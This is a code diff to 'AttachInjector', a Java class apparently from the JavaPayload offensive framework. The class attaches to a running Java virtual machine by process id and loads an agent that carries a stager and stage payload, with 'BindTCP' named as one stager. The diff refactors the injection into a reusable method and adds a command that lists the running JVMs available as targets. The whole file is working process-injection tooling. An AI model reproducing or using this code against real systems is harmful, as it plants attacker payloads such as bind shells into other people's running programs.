@@ -34,48 +34,52 @@
 
 package javapayload.builder;
 
+import java.io.PrintStream;
+import java.util.List;
+
 import javapayload.handler.stager.StagerHandler;
 
 import com.sun.tools.attach.VirtualMachine;
+import com.sun.tools.attach.VirtualMachineDescriptor;
 
 public class AttachInjector {
 	public static void main(String[] args) throws Exception {
+		if (args.length == 1 && args[0].equals("list")) {
+			listVMs(System.out);
+			return;
+		}
 		if (args.length < 5) {
 			System.out.println("Usage: java javapayload.builder.AttachInjector <pid> <agentPath> <stager> [stageroptions] -- <stage> [stageoptions]");
 			return;
 		}
 		final String[] stagerArgs = new String[args.length - 2];
-		final StringBuffer agentArgs = new StringBuffer();
-		final String stager = args[2];
 		for (int i = 2; i < args.length; i++) {
-			if (i != 1) {
-				agentArgs.append(" ");
-			}
-			agentArgs.append(args[i]);
 			stagerArgs[i - 2] = args[i];
 		}
-
-		boolean loadStagerLater = false;
-		if (stager.equals("BindTCP")) {
-			loadStagerLater = true;
-		} else {
-			new Thread(new Runnable() {
-				public void run() {
-					try {
-						StagerHandler.main(stagerArgs);
-					} catch (final Exception ex) {
-						ex.printStackTrace();
-					}
-				}
-			}).start();
+		inject(args[0], args[1], new StagerHandler.Loader(stagerArgs));
+	}
+	
+	public static void inject(String pid, String agentPath, StagerHandler.Loader loader) throws Exception {
+		loader.handleBefore(loader.stageHandler.consoleErr, null); // may modify stagerArgs
+		String[] stagerArgs = loader.getArgs();
+		final StringBuffer agentArgs = new StringBuffer();
+		for (int i = 0; i < stagerArgs.length; i++) {
+			if (i != 0) {
+				agentArgs.append(" ");
+			}
+			agentArgs.append(stagerArgs[i]);
 		}
-
-		final VirtualMachine vm = VirtualMachine.attach(args[0]);
-		vm.loadAgent(args[1], agentArgs.toString());
+		final VirtualMachine vm = VirtualMachine.attach(pid);
+		vm.loadAgent(agentPath, agentArgs.toString());
 		vm.detach();
+		loader.handleAfter(loader.stageHandler.consoleErr, null);
+	}
 
-		if (loadStagerLater) {
-			StagerHandler.main(stagerArgs);
+	public static void listVMs(PrintStream out) {
+		List vms = VirtualMachine.list();
+		for (int i = 0; i < vms.size(); i++) {
+			VirtualMachineDescriptor desc = (VirtualMachineDescriptor) vms.get(i);
+			out.println(desc.id()+"\t"+desc.displayName());
 		}
 	}
 }
